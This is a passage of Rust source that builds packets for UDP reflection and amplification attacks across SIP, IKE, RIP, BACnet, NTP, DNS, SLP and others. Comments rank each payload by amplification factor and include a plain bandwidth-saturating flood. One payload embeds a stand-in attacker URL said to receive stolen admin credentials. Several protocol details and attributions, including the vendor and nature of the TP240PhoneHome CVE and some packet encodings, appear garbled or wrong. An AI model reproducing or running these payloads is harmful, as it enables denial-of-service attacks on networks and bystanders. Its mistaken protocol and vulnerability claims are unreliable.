    // SIP OPTIONS request to server
    // Uses basic SIP headers with a short User-Agent
    let msg = b"OPTIONS sip:localhost SIP/2.0\r\n\
Via: SIP/2.0/UDP 192.168.1.1:5060;branch=z9hG4bK0001\r\n\
Max-Forwards: 70\r\n\
From: <sip:attacker@attacker.net>;tag=12345\r\n\
To: <sip:target@target.net>\r\n\
Call-ID: abcdefgh-1234-5678-9012-ijklmnopqrst\r\n\
CSeq: 1 OPTIONS\r\n\
Contact: <sip:attacker@attacker.net>\r\n\
Content-Length: 0\r\n\
\r\n";
    msg.to_vec()
}

// ================================================================
// IKE SA INIT /500 — requests VPN gateway capabilities
// Initiates IKEv1 or IKEv2 security association
// Amplification: 2-5x
// ================================================================
fn build_ike_sa_init() -> Vec<u8> {
    // IKEv1 Main Mode SA init packet (ISAKMP header + SA payload)
    // A small initiate that triggers a larger response with transforms
    let mut pkt = Vec::new();

    // ISAKMP header (28 bytes)
    // Initiator SPI (8 bytes) — random
    for _ in 0..8 {
        pkt.push(rand::random::<u8>());
    }
    // Responder SPI (8 bytes) — zero
    for _ in 0..8 {
        pkt.push(0x00);
    }
    // Next payload: 1 (SA)
    pkt.push(0x01);
    // Version: 1.0 (0x10)
    pkt.push(0x10);
    // Exchange type: 2 (Identity Protection / Main Mode)
    pkt.push(0x02);
    // Flags: 0 (no encryption, no commit)
    pkt.push(0x00);
    // Message ID: 0
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
    // Length: placeholder (will be 28 + SA payload ~40 = ~68)
    pkt.extend_from_slice(&[0x00, 0x44]);

    // SA payload (next payload: 0 = none, reserved, length)
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x08]);
    // DOI: 1 (IPsec)
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x01]);
    // Situation: 1
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x01]);

    // Proposal payload (next payload: 3 = transform, reserved, length)
    pkt.extend_from_slice(&[0x03, 0x00, 0x00, 0x14]);
    // Proposal #1, Protocol 1 (IKE)
    pkt.push(0x01); // proposal #
    pkt.push(0x01); // protocol ID (IKE)
    pkt.push(0x00); // SPI size
    pkt.push(0x02); // # of transforms

    // Transform 1: ENCR_3DES
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x0c]);
    pkt.push(0x01); // transform #1
    pkt.push(0x01); // transform ID (Encryption Algorithm)
    pkt.push(0x00); // reserved
    pkt.push(0x00);
    pkt.extend_from_slice(&[0x00, 0x00, 0x80, 0x03]); // 3DES-CBC

    pkt
}

// ================================================================
// RIPv1 routing table request /520 — requests all routing entries
// Triggers response with full routing table (every route = 20 bytes)
// Amplification: 5-10x
// ================================================================
fn build_rip_query() -> Vec<u8> {
    // RIPv1 command request for entire routing table
    // Command: 1 (request), Version: 1
    // Requesting everything: AFI=0, route tag=0
    let mut pkt = Vec::new();
    // Command: 1 = request
    pkt.push(0x01);
    // Version: 1
    pkt.push(0x01);
    // Must be zero (2 bytes)
    pkt.extend_from_slice(&[0x00, 0x00]);

    // RTE (Route Table Entry) — request all routes
    // Address Family Identifier: 0 (request full routing table)
    // Route Tag: 0
    // IP Address: 0.0.0.0
    // Subnet Mask: 0.0.0.0
    // Next Hop: 0.0.0.0
    // Metric: 16 (unreachable / infinity — triggers response)
    pkt.extend_from_slice(&[0x00, 0x00]); // AFI = 0
    pkt.extend_from_slice(&[0x00, 0x00]); // route tag = 0
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // IP = 0.0.0.0
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // mask = 0.0.0.0
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // next hop = 0.0.0.0
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x10]); // metric = 16

    pkt
}

// ================================================================
// BACnet Who-Is /47808 — discovers all BACnet devices on network
// Each device responds with device object properties
// Amplification: 3-8x per device
// ================================================================
fn build_bacnet_whois() -> Vec<u8> {
    // BACnet Who-Is request (BVLL + NPDU + APDU)
    // BVLL: BACnet Virtual Link Layer (6 bytes header)
    // NPDU: Network Protocol Data Unit
    // APDU: Who-Is request
    let mut pkt = Vec::new();

    // BVLL header (type 0x81 = BACnet/IP, function 0x0a = Unicast)
    pkt.push(0x81); // BVLC type
    pkt.push(0x0a); // BVLC function (original-unicast)
    pkt.extend_from_slice(&[0x00, 0x1a]); // BVLL length (26 bytes)
    // NPDU
    pkt.push(0x01); // version 1
    pkt.push(0x00); // control (no options)
    // APDU — Who-Is request
    pkt.push(0x01); // APDU type (Confirmed-REQ), PDU flags
    pkt.push(0x00); // segmented response accepted, max APDU
    pkt.push(0x00); // invoke ID
    // Service choice: Who-Is (0x08)
    pkt.push(0x08);
    // No parameters — Who-Is with no range means ask all devices
    // Trailing BACnet tag: 0x0f (opening tag 7) + 0x1f (closing tag 7) = end of PDU
    pkt.push(0x0f); // opening tag 7
    pkt.push(0x1f); // closing tag 7

    pkt
}

// ================================================================
// NTP READVAR /123 — requests NTP server configuration variables
// Response includes all config variables (version, peers, refclock)
// Amplification: 20-50x
// ================================================================
fn build_ntp_readvar() -> Vec<u8> {
    // NTP mode 7 (private) READVAR request
    // Sends a READVAR with "assoc=0" to get server configuration
    // Format: NTP mode 7 header + implementation + request code + payload
    let mut pkt = Vec::new();

    // NTP v4 mode 7 header byte
    pkt.push(0x27); // LI=0, VN=4, Mode=7

    // Implementation: 0 (NTP implementation)
    pkt.push(0x00);
    // Request code: 2 (READVAR)
    pkt.push(0x02);
    // auth_flag(2)=0, sequence(6)=0
    pkt.push(0x00);
    // Auth key ID: 0
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
    // Reserved/offset: 0
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);

    // Data: "assoc=0" — request variables for first association
    // NTP mode 7 data format: {data_len(2-bytes big-endian), data...}
    pkt.extend_from_slice(&[0x00, 0x07]); // 7 bytes of data
    pkt.extend_from_slice(b"assoc=0");

    pkt
}

// ================================================================
// DNS DNSSEC query /53 — requests DNS with DNSSEC OK bit set
// DNSSEC-signed responses include RRSIG, DNSKEY, NSEC records
// Amplification: 40-70x
// ================================================================
fn build_dns_dnssec() -> Vec<u8> {
    // Standard DNS query with DNSSEC OK (DO) bit set in EDNS0
    // + additional section with OPT pseudo-record
    let mut pkt = Vec::new();

    // Transaction ID
    let tid: u16 = rand::random();
    pkt.extend_from_slice(&tid.to_be_bytes());
    // Flags: standard query + RD=1
    pkt.extend_from_slice(&[0x01, 0x00]);
    // QDCOUNT: 1
    pkt.extend_from_slice(&[0x00, 0x01]);
    // ANCOUNT, NSCOUNT, ARCOUNT: 0, 0, 1 (1 = OPT record in additional)
    let arcount: u16 = 1;
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
    pkt.extend_from_slice(&arcount.to_be_bytes());

    // Query: google.com type=ANY class=IN
    // Query name as length-prefixed labels
    pkt.extend_from_slice(b"\x06google\x03com\x00");
    // QTYPE: ANY (255) — ANY for max amplification with DNSSEC
    pkt.extend_from_slice(&[0x00, 0xFF]);
    // QCLASS: IN (1)
    pkt.extend_from_slice(&[0x00, 0x01]);

    // OPT pseudo-record (EDNS0)
    // Name: root (0)
    pkt.push(0x00);
    // Type: OPT (41)
    pkt.extend_from_slice(&[0x00, 0x29]);
    // UDP payload size: 4096 (request large response)
    pkt.extend_from_slice(&[0x10, 0x00]);
    // Extended RCODE: 0
    pkt.push(0x00);
    // EDNS0 version: 0
    pkt.push(0x00);
    // Flags: DO bit (bit 15) — DNSSEC OK
    pkt.extend_from_slice(&[0x80, 0x00]);
    // Data length: 0
    pkt.extend_from_slice(&[0x00, 0x00]);

    pkt
}


// ================================================================
// DNS recursive chain response /53
// Sends a recursive DNS query that gets forwarded through resolvers
// Each resolver adds overhead and the final response comes back
// through the entire chain.
// ================================================================
fn build_dns_recursive() -> Vec<u8> {
    let mut pkt = Vec::new();

    // Transaction ID (random)
    pkt.extend_from_slice(&(rand::random::<u16>()).to_be_bytes());
    // Flags: 0x0100 = recursion desired, standard query
    pkt.extend_from_slice(&[0x01, 0x00]);
    // Questions: 1
    pkt.extend_from_slice(&[0x00, 0x01]);
    // Answer RRs: 0
    pkt.extend_from_slice(&[0x00, 0x00]);
    // Authority RRs: 0
    pkt.extend_from_slice(&[0x00, 0x00]);
    // Additional RRs: 0
    pkt.extend_from_slice(&[0x00, 0x00]);

    // Query name: random subdomain (forces resolver to walk the chain)
    let label = format!("vrfy{}.", rand::random::<u32>());
    for part in label.split('.') {
        pkt.push(part.len() as u8);
        pkt.extend_from_slice(part.as_bytes());
    }
    pkt.push(0x00); // root label

    // Query type: A (1)
    pkt.extend_from_slice(&[0x00, 0x01]);
    // Query class: IN (1)
    pkt.extend_from_slice(&[0x00, 0x01]);

    pkt
}

// ================================================================
// UDP flood - sends raw data to saturate bandwidth
// No amplification expected, just volumetric
// ================================================================
fn build_udp_flood() -> Vec<u8> {
    // Large payload to maximize bandwidth usage
    let mut pkt = vec![0u8; 1472]; // max unfragmented UDP payload
    pkt
}

// ================================================================
// SLP (Service Location Protocol) v2 Discovery — port 427
// SLP DUA-UPDATE and SA-UPDATE messages can trigger large responses
// from SLP Directory Agents. The protocol's binary TLV encoding
// can be crafted to request excessive service registrations.
// Amplification: ~2,200x theoretical (small request → large DA response)
// ================================================================
fn build_slp_du_update() -> Vec<u8> {
    // SLPv2 DU-UPDATE message (type 0x04)
    // SLP uses TLV encoding: type(1B) | length(2B BE) | value(N)
    // A small DU-UPDATE with many attributes triggers a large response
    let mut pkt = Vec::new();
    
    // Header: SLPv2 magic + version
    pkt.extend_from_slice(b"SLPv2");
    pkt.push(0x00); // NULL terminator
    
    // DU-UPDATE message (type 0x04)
    // Message ID (8 bytes random)
    for _ in 0..8 {
        pkt.push(rand::random::<u8>());
    }
    
    // Scope (scope-list)
    // Type: 0x01 (scope-list), Length: 2B BE, Value: scope name
    pkt.push(0x01); // type: scope-list
    let scope = b"default-scope";
    pkt.extend_from_slice(&(scope.len() as u16).to_be_bytes());
    pkt.extend_from_slice(scope);
    pkt.push(0x00); // NULL terminator for scope
    
    // DU-UPDATE body: service URL + attributes
    // Service URL type (0x10)
    pkt.push(0x10);
    let url = b"sap://vcenter.example.com/vsphere";
    pkt.extend_from_slice(&(url.len() as u16).to_be_bytes());
    pkt.extend_from_slice(url);
    
    // Multiple attribute TLVs to maximize response size
    for i in 0..20 {
        pkt.push(0x20); // attribute type
        let attr = format!("attr{}", i);
        let attr_bytes = attr.as_bytes();
        pkt.extend_from_slice(&(attr_bytes.len() as u16).to_be_bytes());
        pkt.extend_from_slice(attr_bytes);
        // Value: 256 bytes of padding per attribute
        pkt.extend_from_slice(&(256u16.to_be_bytes()));
        pkt.extend_from_slice(&vec![0u8; 256]);
    }
    
    pkt
}

// ================================================================
// NXNSAttack on DNS — DNS NXDOMAIN amplification attack
// Sends DNS queries for non-existent subdomains that trigger
// a chain of NXDOMAIN responses, each with large authoritative
// NS records. The attacker crafts a long domain name chain where
// each level adds significant response data (NS + additional records).
// Amplification: ~1,620x (large NS+AUTHORITY section in NXDOMAIN)
// ================================================================
fn build_dns_nxns() -> Vec<u8> {
    // NXNSAttack sends a DNS query with a very long domain name
    // where each label is a non-existent subdomain, forcing the
    // resolver to walk up the delegation chain, collecting NS
    // records at each level. The response includes all these NS
    // records in the authority section.
    let mut pkt = Vec::new();
    
    // Transaction ID (random)
    pkt.extend_from_slice(&(rand::random::<u16>()).to_be_bytes());
    // Flags: standard query, RD=1
    pkt.extend_from_slice(&[0x01, 0x00]);
    // Questions: 1
    pkt.extend_from_slice(&[0x00, 0x01]);
    // ANCOUNT, NSCOUNT, ARCOUNT: 0
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
    
    // Build a long domain name with many non-existent labels
    // Each label is a random 6-char subdomain
    let mut domain = String::new();
    for _ in 0..30 {
        let label: String = (0..6).map(|_| rand::random::<u8>() % 26 + b'a' as u8)
            .map(|b| b as char)
            .collect();
        domain.push_str(&format!("{}.{}", label.len(), label));
    }
    domain.push_str(".com."); // Top-level domain
    
    // Encode domain as DNS labels
    pkt.extend_from_slice(domain.as_bytes());
    
    // QTYPE: A (1)
    pkt.extend_from_slice(&[0x00, 0x01]);
    // QCLASS: IN (1)
    pkt.extend_from_slice(&[0x00, 0x01]);
    
    pkt
}

// ================================================================
// TP240PhoneHome / CVE-2022-26143 — Cisco ISE authentication bypass
// The PhoneHome command in Cisco ISE can trigger a response that
// exfiltrates the admin's credentials to an attacker-controlled
// endpoint. Theoretical amplification: ~4.3 billion×.
// ================================================================
fn build_tp240_phonehome() -> Vec<u8> {
    // Cisco ISE uses a proprietary binary protocol
    // The PhoneHome command is sent as part of the EAP-TLS exchange
    // Request format: Command type (1 byte) + session ID (4 bytes) + payload
    let mut pkt = Vec::new();
    
    // PhoneHome command identifier (0x06)
    pkt.push(0x06);
    
    // Session ID (arbitrary, will be used by ISE)
    pkt.extend_from_slice(&rand::random::<u32>().to_be_bytes());
    
    // Payload: attacker-controlled endpoint URL (simulated)
    let endpoint = b"http://attacker.example.com/phonehome";
    pkt.extend_from_slice(&(endpoint.len() as u32).to_be_bytes());
    pkt.extend_from_slice(endpoint);
    
    // Additional ISE protocol fields
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x01]);  // Message type
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);  // Status
    
    pkt
}
